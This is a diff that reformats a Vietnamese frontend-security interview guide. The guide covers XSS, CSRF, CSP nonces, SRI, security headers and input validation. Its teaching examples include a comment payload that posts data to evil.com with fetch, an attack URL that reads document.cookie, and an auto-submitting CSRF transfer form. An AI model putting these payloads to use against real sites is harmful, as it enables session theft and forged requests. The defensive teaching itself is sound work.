@@ -9,9 +9,6 @@ Security trong frontend thường bị xem nhẹ -- nhiều dev nghĩ "security 
 
 ---
 
-
----
-
 ## Mục lục
 
 - [Câu 1: XSS là gì? Có bao nhiêu loại? Phòng chống như thế nào? `[Senior]`](#câu-1-xss-là-gì-có-bao-nhiêu-loại-phòng-chống-như-thế-nào-senior)
@@ -63,8 +60,8 @@ Comment: "Great article! <script>fetch('https://evil.com/steal', {method:'POST',
 
 ```javascript
 // Vulnerable code
-const name = new URLSearchParams(location.search).get('name');
-document.getElementById('greeting').innerHTML = `Hello, ${name}!`;
+const name = new URLSearchParams(location.search).get("name");
+document.getElementById("greeting").innerHTML = `Hello, ${name}!`;
 
 // Attack URL:
 // https://example.com?name=<img src=x onerror="alert(document.cookie)">
@@ -101,22 +98,22 @@ function SafeRichContent({ html }: { html: string }) {
 
 ```typescript
 // BAD: Dùng innerHTML
-const userInput = getSearchParam('q');
-element.innerHTML = userInput;  // XSS!
+const userInput = getSearchParam("q");
+element.innerHTML = userInput; // XSS!
 
 // GOOD: Dùng textContent (không parse HTML)
-element.textContent = userInput;  // Safe -- chỉ hiển thị text
+element.textContent = userInput; // Safe -- chỉ hiển thị text
 
 // BAD: eval() và tương đương
-eval(userInput);                  // XSS!
-new Function(userInput)();        // XSS!
-setTimeout(userInput, 100);       // XSS nếu userInput là string!
+eval(userInput); // XSS!
+new Function(userInput)(); // XSS!
+setTimeout(userInput, 100); // XSS nếu userInput là string!
 
 // GOOD: Không bao giờ eval user input
 // Nếu cần dynamic behavior, dùng predefined mapping
 const actions: Record<string, () => void> = {
-  'sort-name': () => sortByName(),
-  'sort-date': () => sortByDate(),
+  "sort-name": () => sortByName(),
+  "sort-date": () => sortByDate(),
 };
 const action = actions[userInput];
 if (action) action();
@@ -135,6 +132,7 @@ if (action) action();
 **CSRF (Cross-Site Request Forgery)** là kiểu tấn công khiến browser của victim gửi request đến website mà victim đã đăng nhập, **mà victim không biết**. Browser tự gắn cookies vào request, nên server nghĩ đó là request hợp lệ.
 
 **Kịch bản:**
+
 1. User đăng nhập vào `bank.com` (browser lưu session cookie)
 2. User truy cập `evil.com` (trong tab khác)
 3. `evil.com` có hidden form submit đến `bank.com/transfer?to=attacker&amount=10000`
@@ -150,7 +148,9 @@ if (action) action();
   <input type="hidden" name="to" value="attacker-account" />
   <input type="hidden" name="amount" value="10000" />
 </form>
-<script>document.getElementById('csrf-form').submit();</script>
+<script>
+  document.getElementById("csrf-form").submit();
+</script>
 ```
 
 **Phòng chống bằng CSRF Token:**
@@ -162,7 +162,7 @@ if (action) action();
 // Lấy CSRF token từ meta tag (server render)
 function getCsrfToken(): string {
   const meta = document.querySelector('meta[name="csrf-token"]');
-  return meta?.getAttribute('content') || '';
+  return meta?.getAttribute("content") || "";
 }
 
 // Gắn vào mọi request
@@ -173,10 +173,10 @@ async function apiRequest(url: string, options: RequestInit = {}) {
     ...options,
     headers: {
       ...options.headers,
-      'Content-Type': 'application/json',
-      'X-CSRF-Token': csrfToken,
+      "Content-Type": "application/json",
+      "X-CSRF-Token": csrfToken,
     },
-    credentials: 'same-origin',  // Gửi cookies cho same-origin requests
+    credentials: "same-origin", // Gửi cookies cho same-origin requests
   });
 }
 ```
@@ -195,23 +195,25 @@ Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly
 
 ```typescript
 // Express.js cookie config
-app.use(session({
-  cookie: {
-    httpOnly: true,     // JavaScript không đọc được cookie
-    secure: true,       // Chỉ gửi qua HTTPS
-    sameSite: 'lax',    // Chống CSRF
-    maxAge: 24 * 60 * 60 * 1000, // 1 day
-  },
-}));
+app.use(
+  session({
+    cookie: {
+      httpOnly: true, // JavaScript không đọc được cookie
+      secure: true, // Chỉ gửi qua HTTPS
+      sameSite: "lax", // Chống CSRF
+      maxAge: 24 * 60 * 60 * 1000, // 1 day
+    },
+  }),
+);
 ```
 
 ### Bảng so sánh SameSite values
 
-| Value | Cross-site POST | Cross-site GET (link) | Cross-site iframe | CSRF Protection |
-|-------|----------------|----------------------|-------------------|----------------|
-| **Strict** | Blocked | Blocked | Blocked | Mạnh nhất |
-| **Lax** | Blocked | Allowed | Blocked | Tốt (default hiện tại) |
-| **None** | Allowed | Allowed | Allowed | Không có |
+| Value      | Cross-site POST | Cross-site GET (link) | Cross-site iframe | CSRF Protection        |
+| ---------- | --------------- | --------------------- | ----------------- | ---------------------- |
+| **Strict** | Blocked         | Blocked               | Blocked           | Mạnh nhất              |
+| **Lax**    | Blocked         | Allowed               | Blocked           | Tốt (default hiện tại) |
+| **None**   | Allowed         | Allowed               | Allowed           | Không có               |
 
 ### Đáp án mẫu
 
@@ -261,10 +263,10 @@ object-src 'none'           → Không cho phép Flash/plugins
 
 ```typescript
 // Server generate unique nonce mỗi request
-import crypto from 'crypto';
+import crypto from "crypto";
 
 function generateNonce(): string {
-  return crypto.randomBytes(16).toString('base64');
+  return crypto.randomBytes(16).toString("base64");
 }
 
 // Middleware
@@ -273,8 +275,8 @@ app.use((req, res, next) => {
   res.locals.nonce = nonce;
 
   res.setHeader(
-    'Content-Security-Policy',
-    `default-src 'self'; script-src 'self' 'nonce-${nonce}'; style-src 'self' 'unsafe-inline'`
+    "Content-Security-Policy",
+    `default-src 'self'; script-src 'self' 'nonce-${nonce}'; style-src 'self' 'unsafe-inline'`,
   );
 
   next();
@@ -285,16 +287,19 @@ app.use((req, res, next) => {
 <!-- Chỉ script có đúng nonce mới được execute -->
 <script nonce="abc123">
   // Script này được phép chạy
-  console.log('Legitimate script');
+  console.log("Legitimate script");
 </script>
 
 <script>
   // Script này bị block vì không có nonce
-  console.log('Blocked by CSP');
+  console.log("Blocked by CSP");
 </script>
 
 <!-- Injected script cũng bị block -->
-<script>alert('XSS')</script>  <!-- Blocked! -->
+<script>
+  alert("XSS");
+</script>
+<!-- Blocked! -->
 ```
 
 **CSP report-only mode (test trước khi enforce):**
@@ -308,12 +313,12 @@ Content-Security-Policy-Report-Only:
 
 ```typescript
 // Endpoint nhận CSP violation reports
-app.post('/api/csp-reports', (req, res) => {
-  const report = req.body['csp-report'];
-  console.log('CSP violation:', {
-    blockedUri: report['blocked-uri'],
-    violatedDirective: report['violated-directive'],
-    documentUri: report['document-uri'],
+app.post("/api/csp-reports", (req, res) => {
+  const report = req.body["csp-report"];
+  console.log("CSP violation:", {
+    blockedUri: report["blocked-uri"],
+    violatedDirective: report["violated-directive"],
+    documentUri: report["document-uri"],
   });
   res.status(204).end();
 });
@@ -363,16 +368,16 @@ shasum -b -a 384 react.production.min.js | awk '{ print $1 }' | xxd -r -p | base
 
 ```typescript
 // webpack.config.js
-const SriPlugin = require('webpack-subresource-integrity');
+const SriPlugin = require("webpack-subresource-integrity");
 
 module.exports = {
   output: {
-    crossOriginLoading: 'anonymous',
+    crossOriginLoading: "anonymous",
   },
   plugins: [
     new SriPlugin({
-      hashFuncNames: ['sha384'],
-      enabled: process.env.NODE_ENV === 'production',
+      hashFuncNames: ["sha384"],
+      enabled: process.env.NODE_ENV === "production",
     }),
   ],
 };
@@ -403,18 +408,18 @@ module.exports = {
 
 ### Bảng OWASP Top 10 liên quan đến Frontend
 
-| # | Risk | Frontend Relevance | Phòng chống |
-|---|------|-------------------|-------------|
-| **A03** | Injection (XSS) | **Cao** | Escape output, sanitize input, CSP |
-| **A05** | Security Misconfiguration | **Cao** | CSP, secure headers, no debug in prod |
-| **A07** | Identification & Auth Failures | **Cao** | Secure token storage, logout |
-| **A08** | Software & Data Integrity | **Trung bình** | SRI, dependency audit |
-| **A09** | Security Logging & Monitoring | **Trung bình** | Client-side error tracking |
-| **A01** | Broken Access Control | **Trung bình** | Route guards (but enforce on server) |
-| **A02** | Cryptographic Failures | **Thấp** | HTTPS only, no secrets in client |
-| **A04** | Insecure Design | **Thấp** | Threat modeling |
-| **A06** | Vulnerable Components | **Cao** | npm audit, Snyk, Dependabot |
-| **A10** | SSRF | **Thấp** | Validate URLs on server |
+| #       | Risk                           | Frontend Relevance | Phòng chống                           |
+| ------- | ------------------------------ | ------------------ | ------------------------------------- |
+| **A03** | Injection (XSS)                | **Cao**            | Escape output, sanitize input, CSP    |
+| **A05** | Security Misconfiguration      | **Cao**            | CSP, secure headers, no debug in prod |
+| **A07** | Identification & Auth Failures | **Cao**            | Secure token storage, logout          |
+| **A08** | Software & Data Integrity      | **Trung bình**     | SRI, dependency audit                 |
+| **A09** | Security Logging & Monitoring  | **Trung bình**     | Client-side error tracking            |
+| **A01** | Broken Access Control          | **Trung bình**     | Route guards (but enforce on server)  |
+| **A02** | Cryptographic Failures         | **Thấp**           | HTTPS only, no secrets in client      |
+| **A04** | Insecure Design                | **Thấp**           | Threat modeling                       |
+| **A06** | Vulnerable Components          | **Cao**            | npm audit, Snyk, Dependabot           |
+| **A10** | SSRF                           | **Thấp**           | Validate URLs on server               |
 
 ### Code ví dụ
 
@@ -422,7 +427,7 @@ module.exports = {
 
 ```typescript
 // BAD: Store JWT trong localStorage (XSS có thể đọc)
-localStorage.setItem('token', jwt);
+localStorage.setItem("token", jwt);
 
 // BAD: Store JWT trong regular cookie (CSRF risk)
 document.cookie = `token=${jwt}`;
@@ -530,25 +535,31 @@ function ProtectedRoute({ children }: { children: React.ReactNode }) {
 // Express.js middleware (hoặc Next.js headers config)
 app.use((req, res, next) => {
   // Chống XSS: CSP
-  res.setHeader('Content-Security-Policy', "default-src 'self'");
+  res.setHeader("Content-Security-Policy", "default-src 'self'");
 
   // Chống clickjacking: không cho phép iframe
-  res.setHeader('X-Frame-Options', 'DENY');
+  res.setHeader("X-Frame-Options", "DENY");
 
   // Không cho browser sniff MIME type
-  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader("X-Content-Type-Options", "nosniff");
 
   // Chống thông tin về server
-  res.removeHeader('X-Powered-By');
+  res.removeHeader("X-Powered-By");
 
   // HTTPS only
-  res.setHeader('Strict-Transport-Security', 'max-age=63072000; includeSubDomains; preload');
+  res.setHeader(
+    "Strict-Transport-Security",
+    "max-age=63072000; includeSubDomains; preload",
+  );
 
   // Kiểm soát thông tin gửi trong Referer header
-  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+  res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
 
   // Kiểm soát browser features
-  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
+  res.setHeader(
+    "Permissions-Policy",
+    "camera=(), microphone=(), geolocation=()",
+  );
 
   next();
 });
@@ -560,28 +571,28 @@ app.use((req, res, next) => {
 // next.config.js
 const securityHeaders = [
   {
-    key: 'X-DNS-Prefetch-Control',
-    value: 'on',
+    key: "X-DNS-Prefetch-Control",
+    value: "on",
   },
   {
-    key: 'Strict-Transport-Security',
-    value: 'max-age=63072000; includeSubDomains; preload',
+    key: "Strict-Transport-Security",
+    value: "max-age=63072000; includeSubDomains; preload",
   },
   {
-    key: 'X-Frame-Options',
-    value: 'SAMEORIGIN',
+    key: "X-Frame-Options",
+    value: "SAMEORIGIN",
   },
   {
-    key: 'X-Content-Type-Options',
-    value: 'nosniff',
+    key: "X-Content-Type-Options",
+    value: "nosniff",
   },
   {
-    key: 'Referrer-Policy',
-    value: 'strict-origin-when-cross-origin',
+    key: "Referrer-Policy",
+    value: "strict-origin-when-cross-origin",
   },
   {
-    key: 'Permissions-Policy',
-    value: 'camera=(), microphone=(), geolocation=()',
+    key: "Permissions-Policy",
+    value: "camera=(), microphone=(), geolocation=()",
   },
 ];
 
@@ -589,7 +600,7 @@ module.exports = {
   async headers() {
     return [
       {
-        source: '/(.*)',
+        source: "/(.*)",
         headers: securityHeaders,
       },
     ];
@@ -647,28 +658,25 @@ function UserComment({ comment }: { comment: { html: string; authorUrl: string }
 **Validate và sanitize form input:**
 
 ```typescript
-import { z } from 'zod';
+import { z } from "zod";
 
 // Schema validation -- reject invalid input early
 const commentSchema = z.object({
   // Giới hạn length để chống DoS
-  text: z.string()
-    .min(1, 'Comment cannot be empty')
-    .max(5000, 'Comment too long')
+  text: z
+    .string()
+    .min(1, "Comment cannot be empty")
+    .max(5000, "Comment too long")
     .transform((val) => val.trim()),
 
   // Email validation
-  email: z.string()
-    .email('Invalid email')
-    .toLowerCase(),
+  email: z.string().email("Invalid email").toLowerCase(),
 
   // URL validation
-  website: z.string()
-    .url('Invalid URL')
-    .refine(
-      (url) => url.startsWith('https://'),
-      'Only HTTPS URLs allowed'
-    )
+  website: z
+    .string()
+    .url("Invalid URL")
+    .refine((url) => url.startsWith("https://"), "Only HTTPS URLs allowed")
     .optional(),
 });
 
@@ -688,17 +696,17 @@ function handleCommentSubmit(formData: unknown) {
 
 ### Bảng so sánh các loại tấn công và cách phòng chống
 
-| Attack | Mô tả | Phòng chống Frontend | Phòng chống Backend |
-|--------|--------|---------------------|---------------------|
-| **Reflected XSS** | Payload trong URL, server reflect | CSP, escape output | Validate input, encode output |
-| **Stored XSS** | Payload lưu DB, serve cho mọi user | CSP, DOMPurify cho rich content | Sanitize on input AND output |
-| **DOM XSS** | Client JS inject payload vào DOM | textContent thay innerHTML, sanitize URL | N/A (client-side only) |
-| **CSRF** | Trick browser gửi authenticated request | SameSite cookies | CSRF tokens, check Origin header |
-| **Clickjacking** | Overlay invisible iframe lên UI | X-Frame-Options header | X-Frame-Options / CSP frame-ancestors |
-| **Supply chain** | Compromised npm package hoặc CDN | SRI, npm audit, lockfile | Dependabot, Snyk |
-| **Open redirect** | Redirect user đến malicious site | Validate redirect URLs | Whitelist allowed domains |
-| **Sensitive data exposure** | Secrets trong source code / localStorage | Không store secrets client-side | HTTP-only cookies, env vars |
-| **Insecure deserialization** | Malicious JSON/data from untrusted source | Validate schema (Zod) | Input validation, type checking |
+| Attack                       | Mô tả                                     | Phòng chống Frontend                     | Phòng chống Backend                   |
+| ---------------------------- | ----------------------------------------- | ---------------------------------------- | ------------------------------------- |
+| **Reflected XSS**            | Payload trong URL, server reflect         | CSP, escape output                       | Validate input, encode output         |
+| **Stored XSS**               | Payload lưu DB, serve cho mọi user        | CSP, DOMPurify cho rich content          | Sanitize on input AND output          |
+| **DOM XSS**                  | Client JS inject payload vào DOM          | textContent thay innerHTML, sanitize URL | N/A (client-side only)                |
+| **CSRF**                     | Trick browser gửi authenticated request   | SameSite cookies                         | CSRF tokens, check Origin header      |
+| **Clickjacking**             | Overlay invisible iframe lên UI           | X-Frame-Options header                   | X-Frame-Options / CSP frame-ancestors |
+| **Supply chain**             | Compromised npm package hoặc CDN          | SRI, npm audit, lockfile                 | Dependabot, Snyk                      |
+| **Open redirect**            | Redirect user đến malicious site          | Validate redirect URLs                   | Whitelist allowed domains             |
+| **Sensitive data exposure**  | Secrets trong source code / localStorage  | Không store secrets client-side          | HTTP-only cookies, env vars           |
+| **Insecure deserialization** | Malicious JSON/data from untrusted source | Validate schema (Zod)                    | Input validation, type checking       |
 
 ### Đáp án mẫu
 
